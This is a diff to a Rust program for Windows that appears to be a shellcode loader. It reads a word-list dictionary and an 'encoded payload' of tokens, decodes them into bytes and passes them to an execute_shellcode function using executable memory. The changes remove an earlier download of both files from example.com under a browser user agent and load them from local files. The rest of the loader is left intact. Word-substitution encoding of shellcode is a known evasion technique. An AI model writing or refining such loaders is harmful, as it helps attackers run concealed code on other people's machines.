@@ -13,10 +13,9 @@ use windows_sys::Win32::System::Memory::{
     MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ,
 };
 
-const DICTIONARY_URL: &str = "https://example.com/dictionary.txt";
-const PAYLOAD_URL: &str = "https://example.com/load.txt";
-const DICTIONARY_PATH: &str = "dictionary.txt";
-const MAX_RETRIES: u8 = 3;
+// Updated URLs to use local files
+const DICTIONARY_PATH: &str = "es-dictionary.txt";
+const PAYLOAD_PATH: &str = "load.txt";
 
 /// Initialize the logger with appropriate settings
 fn setup_logging() -> Result<(), Box<dyn Error>> {
@@ -30,92 +29,25 @@ fn setup_logging() -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
-/// Ensure HTTPS URLs for security
-fn validate_url(url: &str) -> Result<(), Box<dyn Error>> {
-    if !url.starts_with("https://") {
-        return Err(format!("Non-HTTPS URL detected: {}", url).into());
-    }
-    Ok(())
-}
-
-/// Download content with retry mechanism
-fn download_with_retries(url: &str, retries: u8) -> Result<String, Box<dyn Error>> {
-    info!("Downloading from: {}", url);
-    
-    let client = blocking::ClientBuilder::new()
-        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-        .timeout(Duration::from_secs(30))
-        .build()?;
-    
-    for attempt in 1..=retries {
-        match client.get(url).send() {
-            Ok(response) => {
-                if response.status().is_success() {
-                    match response.text() {
-                        Ok(text) if !text.is_empty() => {
-                            debug!("Successfully downloaded {} bytes", text.len());
-                            return Ok(text);
-                        },
-                        Ok(_) => warn!("Received empty response from {}", url),
-                        Err(e) => warn!("Failed to extract text: {}", e),
-                    }
-                } else {
-                    warn!("Received status code {}: {}", response.status(), url);
-                }
-            },
-            Err(e) => warn!("Request error on attempt {}: {}", attempt, e),
-        }
-        
-        if attempt < retries {
-            let backoff = Duration::from_secs(2u64.pow(attempt as u32));
-            debug!("Retrying in {:?}", backoff);
-            std::thread::sleep(backoff);
-        }
-    }
-    
-    Err(format!("Failed to retrieve content after {} attempts", retries).into())
-}
-
-/// Cache dictionary or load from existing cache
-fn cache_dictionary() -> Result<Vec<String>, Box<dyn Error>> {
+/// Load the dictionary from the local file
+fn load_dictionary() -> Result<Vec<String>, Box<dyn Error>> {
     let path = Path::new(DICTIONARY_PATH);
     
-    // Try to load from cache first
-    if path.exists() {
-        info!("Loading dictionary from cache");
-        let mut content = String::new();
-        File::open(path)?
-            .read_to_string(&mut content)?;
-            
-        let words = content
-            .lines()
-            .map(String::from)
-            .collect::<Vec<String>>();
-            
-        info!("Loaded {} words from cache", words.len());
-        
-        if words.is_empty() {
-            return Err("Dictionary is empty".into());
-        }
-        
-        return Ok(words);
+    if !path.exists() {
+        return Err(format!("Dictionary file not found: {}", DICTIONARY_PATH).into());
     }
     
-    // Download and cache
-    info!("Downloading dictionary from {}", DICTIONARY_URL);
-    let text = download_with_retries(DICTIONARY_URL, MAX_RETRIES)?;
-    
-    // Create cache file
-    info!("Caching dictionary to {}", DICTIONARY_PATH);
-    File::create(path)?
-        .write_all(text.as_bytes())?;
-    
-    let words = text
+    info!("Loading dictionary from {}", DICTIONARY_PATH);
+    let mut content = String::new();
+    File::open(path)?
+        .read_to_string(&mut content)?;
+        
+    let words = content
         .lines()
         .map(String::from)
         .collect::<Vec<String>>();
         
-    info!("Cached {} words", words.len());
+    info!("Loaded {} words from dictionary", words.len());
     
     if words.is_empty() {
         return Err("Dictionary is empty".into());
@@ -124,17 +56,25 @@ fn cache_dictionary() -> Result<Vec<String>, Box<dyn Error>> {
     Ok(words)
 }
 
-/// Download the encoded payload
-fn download_load() -> Result<Vec<String>, Box<dyn Error>> {
-    info!("Downloading payload from {}", PAYLOAD_URL);
-    let text = download_with_retries(PAYLOAD_URL, MAX_RETRIES)?;
+/// Load the encoded payload from the local file
+fn load_payload() -> Result<Vec<String>, Box<dyn Error>> {
+    let path = Path::new(PAYLOAD_PATH);
     
-    let tokens = text
+    if !path.exists() {
+        return Err(format!("Payload file not found: {}", PAYLOAD_PATH).into());
+    }
+    
+    info!("Loading encoded payload from {}", PAYLOAD_PATH);
+    let mut content = String::new();
+    File::open(path)?
+        .read_to_string(&mut content)?;
+    
+    let tokens = content
         .split_whitespace()
         .map(String::from)
         .collect::<Vec<String>>();
         
-    info!("Downloaded {} encoded tokens", tokens.len());
+    info!("Loaded {} encoded tokens", tokens.len());
     
     if tokens.is_empty() {
         return Err("Payload is empty".into());
@@ -213,46 +153,26 @@ fn execute_shellcode(shellcode: &[u8]) -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
-/// Perform pre-execution security checks
-fn security_checks() -> Result<(), Box<dyn Error>> {
-    debug!("Performing security checks");
-    
-    // Validate URLs (ensure HTTPS)
-    validate_url(DICTIONARY_URL)?;
-    validate_url(PAYLOAD_URL)?;
-    
-    // Additional security checks could be added here
-    
-    Ok(())
-}
-
 fn main() -> Result<(), Box<dyn Error>> {
     // Initialize logging
     setup_logging()?;
     
     info!("Application starting");
     
-    // Run security checks
-    let result = security_checks();
-    if let Err(e) = &result {
-        error!("Security checks failed: {}", e);
-    }
-    result?;
-    
-    // Get dictionary (from cache or download)
-    let dict = match cache_dictionary() {
+    // Get dictionary
+    let dict = match load_dictionary() {
         Ok(d) => d,
         Err(e) => {
-            error!("Dictionary retrieval failed: {}", e);
+            error!("Dictionary loading failed: {}", e);
             return Err(e);
         }
     };
     
-    // Download encoded payload
-    let tokens = match download_load() {
+    // Load encoded payload
+    let tokens = match load_payload() {
         Ok(t) => t,
         Err(e) => {
-            error!("Payload retrieval failed: {}", e);
+            error!("Payload loading failed: {}", e);
             return Err(e);
         }
     };
@@ -296,11 +216,5 @@ mod tests {
         
         let result = decode_payload(&tokens, &dict).unwrap();
         assert_eq!(result, vec![1, 255, 0]);
-    }
-    
-    #[test]
-    fn test_validate_url() {
-        assert!(validate_url("https://example.com").is_ok());
-        assert!(validate_url("http://example.com").is_err());
     }
 }
